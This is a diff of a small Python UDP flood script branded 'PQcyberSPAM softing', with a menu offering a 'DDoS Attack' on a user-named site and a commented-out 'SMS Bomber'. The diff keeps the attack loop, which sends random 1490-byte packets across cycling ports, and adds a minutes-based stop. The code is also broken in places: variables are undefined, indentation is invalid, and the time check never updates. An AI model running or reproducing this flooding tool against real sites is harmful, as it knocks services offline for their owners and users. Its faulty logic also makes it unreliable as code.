@@ -5,7 +5,6 @@ import socket
 import random
 
 os.system("clear")
-os.system("figlet DDos Attack")
 
 from datetime import datetime
 now = datetime.now()
@@ -21,40 +20,41 @@ bytes = random._urandom(1490)
 sent = 0
 limit = 0
 app = 0
+port = 0
 
 print('##########################################')
 print ('Wellcome to PQcyberSPAM softing')
 print()
-print()
 print ('Get SOFT')
 print ('[1] - DDoS Attack http://SITE')
-print ('[2] - SMS Bomber')
+#   print ('[2] - SMS Bomber')
+print()
 print('##########################################')
 print()
-print()
-print()
+            # print
+            # app = int(input('select a number to launch the app: '))
+            # if app == 1:
 print
-app = int(input('select a number to launch the app'))
-if app == 1:
-    print
 site = input('Имя сайта: ')
 ip = socket.gethostbyname(site) 
 
 print ('Site IP: ',ip)
-#print(ip)
-
+print()
+print('##########################################')
+#print
+#siteport = int(input('port: '))
+print()
 print
-port = int(input('port: '))
-print
-limit = int(input('attack limit: '))
-
+limit = int(input('attack limit(minute): '))
+stopminute = minute + limit
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print ('Sent %s packet to %s throught port:%s'%(sent,ip,port))
-     if sent == limit:
-          sys.exit()
+     print (now.minute)
      if port == 65534:
        port = 1
-
+     #if sent == limit:
+           if stopminute == now.minute: 
+          sys.exit()
